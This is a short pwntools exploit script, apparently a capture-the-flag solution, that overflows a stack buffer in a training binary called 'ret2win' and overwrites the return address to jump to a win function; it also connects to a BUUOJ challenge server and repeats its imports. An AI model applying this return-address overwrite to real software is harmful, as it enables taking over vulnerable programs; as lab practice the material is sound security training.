from pwn import * 
from pwn import p64
import socket

host = 'node4.buuoj.cn'
ip = socket.gethostbyname(host)
r = remote(ip,26150)#远程连接

from pwn import * 
from pwn import p64
import socket

context(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']
r = process("./ret2win")
payload = b'A'*0x20 + b"junkjunk" + p64(0x00400756)
r.sendlineafter(b">",payload)
r.interactive()

